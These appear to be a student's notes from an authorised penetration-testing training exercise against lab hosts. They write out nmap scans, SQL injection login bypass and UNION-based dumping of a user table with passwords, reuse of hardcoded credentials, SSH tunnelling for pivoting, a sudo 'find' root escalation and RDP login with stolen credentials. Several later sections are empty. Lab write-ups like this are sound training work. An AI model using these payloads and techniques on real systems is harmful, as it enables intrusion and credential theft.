
## OPERATION: DRY RUN ##

SITREP: This is a dry run operation to prepare you for tomorrow's real operation. You will be provided with a mission task sheet, RoE, and scope.

Maintain 'low visibility' on the wire, as security products may be in place, and document your actions and results as you will be expected to provide OpNotes at the end of the operation.

Take notes on this document.

Dry Run Operation
XX June 2024
Start Time: 0830
Duration: 3 hours

Type of Operation: Information Systems Penetration Test

Objective:Actively exploit and attack networked information systems for the purposes of identifying and reporting vulnerabilities.

Tasking:Perform all tasks outlined in this document.

Mission Scope:

All public facing systems of target entitiy excluding devices responsible for networking (routers, switches, etc). Known web address will be supplied out of band.

Internal network of target entity excluding devices responsible for networking (routers, switches, etc)


RoE:

Google docs, and all other shareable document platforms, are forbidden during this operation.

All communication platforms and applications, such as Slack or Gmail, are forbidden during this operation.

You are authorized to modify passwords to user accounts.

Writing to disk is authorized on all machines.

You will not destroy data/systems, perform DoS, or otherwise disrupt business operations of any entity during this penetration test.

You will not use Metasploit tools for any affect with the exception of shellcode generation.

You will not target routers, switches or other networking devices.

You will not target entities or systems outside of the scope previously defined.

You will not interfere with other entities' operations in any way.

Prior Approvals: OSINT through publicly available resources. Scrape appropriate web content that will provide operational data. Testing of found credentials. NOT approved to change routing or destroy data.

Data is only encoded into base64

10.50 assigned. -> 10.50.29.144 (public facing) 

### 1. PublicFacingWebsite ###

#### Perform Reconnaissance  ####

Step 1. student@lin-ops:~$ `nmap 10.50.29.144`

    Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-17 13:51 UTC
    Nmap scan report for 10.50.29.144
    Host is up (0.0043s latency).
    Not shown: 998 filtered ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 4.84 seconds

Step 2: student@lin-ops:~$ `nmap -Pn -sT 10.50.29.144 -p 80 --script http-enum.nse`

    Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-17 13:54 UTC
    Nmap scan report for 10.50.29.144
    Host is up (0.013s latency).

    PORT   STATE SERVICE
    80/tcp open  http
    | http-enum: 
    |   /login.php: Possible admin folder
    |   /login.html: Possible admin folder
    |   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

    Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds

Step 3. Open reminna and login to your linops and open firefox on there. Enter the ip address 10.50.29.144 and see what's on there.... 

Step 4. wget on the `wget -r http://10.50.29.144:80` to download all the files for this address

Step 5. Check /login.html -> gives a login page. Lets try to sql inject it

    1. In both the password and username field, enter: tom' or 1='1
    2. Displays a user, welcome Aaron


Step 6. Check /login.php

    1. Displays a user, welcome Aaron
    2. username could potentially be Aaron

Step 7. Check /img/
    
    1. Found nothing useful here

Step 8. Check /scripts/

    1. Went to http://10.50.29.144/scripts/
    2. Found patent directory and development.py
    3. Patent directory -> Nothing here 
    4. Development.py 

        #!/usr/bin/python3
        import os

        system_user=user2
        user_password=EaglesIsARE78

        ##Developer note

        #script will eventually take above system user credentials and run automated services

        Gives us username as user2 and the password as EaglesIsARE78.

Step 9.  Attempt initial access using the username from step 8 and the password                                                   

#### Attempt Exploitation || Gain Initial Access ####

Step 1. Since tcp and http were open and we've looked at the http section, lets now look at the tcp section. 

Step 2. `ssh user2@10.50.29.144 -D 9050` let's dynamically connect to this user 

Step 3. logs us in... let's see if we can find additional targets

#### Find Additional Targets ####

Step 1. `cat /etc/hosts` gives us an additional host

    127.0.0.1 localhost

    # The following lines are desirable for IPv6 capable hosts
    ::1 ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    ff02::3 ip6-allhosts
    192.168.28.181 WebApp

Step 2. Looks like we have a new host called WebApp at 192.168.28.181

Step 3. EaglesIsARE78

#### Pivot to Found Targets ####

Step 1. type bash in the window after login to get to the bash terminal and then run your for loop to do the ping sweep. For loop to be run `for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done`

    $ bash
    user2@PublicFacingWebsite:/$ for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
    64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=1.13 ms
    64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=0.550 ms
    64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.067 ms

Step 2. We have three addresses, 192.168.28.172, 192.168.28.181 and 192.168.28.190

Step 3. Check 192.168.28.172. student@lin-ops:~$ `proxychains nmap 192.168.28.172` shows that we have:

    Nmap scan report for 192.168.28.172
    Host is up (0.00034s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh

    Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

Step 4. Check 192.168.28.181. student@lin-ops:~$ `proxychains nmap 192.168.28.181`

    Nmap scan report for 192.168.28.181
    Host is up (0.00034s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds


Step 5. Check 192.168.28.190 -> ignore this as told by the instructor so the ip to work with is .172 and .181. The later has http and tcp open so lets go for the tcp and see who's this guy. 

Step 6. Since .181 has an http open, let's do an enumeration scan on him. student@lin-ops:~$ `nmap -Pn -sT 192.168.28.181 -p 80 --script http-enum.nse` which will give you this result

    Nmap scan report for 192.168.28.181
    Host is up (0.0035s latency).

    PORT   STATE SERVICE
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds

Step 7. Change the proxy settings. Check notes on how to do this 

Step 8. http://192.168.28.181/pick.php?product=7 or 1=1

Step 9. http://192.168.28.181/pick.php?product=7 Union SELECT 1,2,3

Step 10. Golden statement `http://192.168.28.181/pick.php?product=7 union select table_schema, column_name, table_name FROM information_schema.columns`



FAILED TO WORK Step 11. Select important information - `http://192.168.28.181/pick.php?product=7 union select siteusers, users, username FROM information_schema.columns`

FAILED TO WORK Step 11. Select important information - `http://192.168.28.181/pick.php?product=7 union select siteusers, users, name FROM siteusers.users`

Tabel_schema = database name = siteusers

column_Name = column name = users,customer etc

table_Name = table name = username, user-id, id etc

Right click to duplicate the tab

/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns

http://192.168.28.181/pick.php?product=7 union select table_schema, column_name, table_name FROM information_schema.columns


FAILED TO WORK Step 11. Select important information - `http://192.168.28.181/pick.php?product=7 union select name, users,username,user_id FROM siteusers.users`

        Item 	On Hand 	Price
        HAM 	32 	        $15
        1 	    3 	        $2

        
        siteusers 	users 	$user_id
        siteusers 	users 	$name
        siteusers 	users 	$username


Step 11. Select important information - `http://192.168.28.181/pick.php?product=7 UNION SELECT * FROM siteusers.users`

        Item 	On Hand 	                Price
        HAM 	32 	                        $15
        1 	    Aaron 	                    $Aaron
        2 	    user2 	                    user2
        3 	    user3 	                    $user3
        4 	    Lroth 	                    $Lee_Roth
        1 	    ncnffjbeqlCn$$jbeq 	        $Aaron
        2 	    RntyrfVfNER78 	            $user2
        3 	    Obo4GURRnccyrf 	            $user3
        4 	    anotherpassword4THEages 	$Lroth

Step 12. We have password= ncnffjbeqlCn$$jbeq 	       username= $Aaron. Let's ssh to .172 with this information

Step 13. Let's create a local tunnel to .172 and use Aaron's credentials 

student@lin-ops:~$ ssh user2@10.50.29.144 -L 43434:192.168.28.172:22
student@lin-ops:~$ ssh Aaron@localhost -p 43434

convert ncnffjbeqlCn$$jbeq to ROTH13 using https://rot13.com/ gives the password as apasswordyPa$$word


### 2. BestWebApp ###



#### Perform Reconnaissance  ####

#### Attempt Exploitation || Gain Initial Access ####

#### Find Additional Targets ####

#### Pivot to Found Targets ####

### 3. RoundSensor ###

#### Perform Reconnaissance  ####

Step 1. Check what Aaron can run e.g. `sudo -l` which gives the following 

    $ sudo -l
    Matching Defaults entries for Aaron on RoundSensor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User Aaron may run the following commands on RoundSensor:
    (ALL) NOPASSWD: /usr/bin/find


Step 2. Go to GTFO bins and find the vulnerability for find. 

Step 3. The following command run and changed the user to root `sudo find . -exec /bin/sh \; -quit`

Step 4. You know have root privileges

Step 5. Run `for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done` to see which ips are open and this gives 

        64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.037 ms
        64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=1.17 ms
        64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.353 ms
        64 bytes from 192.168.28.222: icmp_seq=1 ttl=64 time=5.92 ms

Step 6. Check 192.168.28.181. student@lin-ops:~$ `proxychains nmap 192.168.28.179`

        Nmap scan report for 192.168.28.179
        Host is up (0.00056s latency).
        Not shown: 994 closed ports
        PORT     STATE SERVICE
        22/tcp   open  ssh
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        3389/tcp open  ms-wbt-server
        9999/tcp open  abyss

Step 7. 3389/tcp open  ms-wbt-server from step 6 means we can RDP 

Step 8. Check 192.168.28.181. student@lin-ops:~$ `proxychains nmap 192.168.28.222`

        Nmap scan report for 192.168.28.222
        Host is up (0.00060s latency).
        All 1000 scanned ports on 192.168.28.222 are closed

        Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds

Step 9: Create a local tunnel from extranet to Internal IP

student@lin-ops:~$ `ssh Aaron@localhost -p 43434 -L 43435:192.168.28.179:3389` 

Step 10:

Use xrdp to get in the windows box

student@lin-ops:~$ `xfreerdp /v:127.0.0.1:43435 /u:Lroth /p:anotherpassword4THEages /size:1920x1000 +clipboard /cert-ignore` 

#### Attempt Exploitation || Gain Initial Access ####

#### Find Additional Targets ####

### Pivot to Found Targets ###

### 4. Windows-Workstation ###

#### Perform Reconnaissance  ####

#### Attempt Exploitation || Gain Initial Access ####

#### Find Additional Targets ####

#### Pivot to Found Targets ####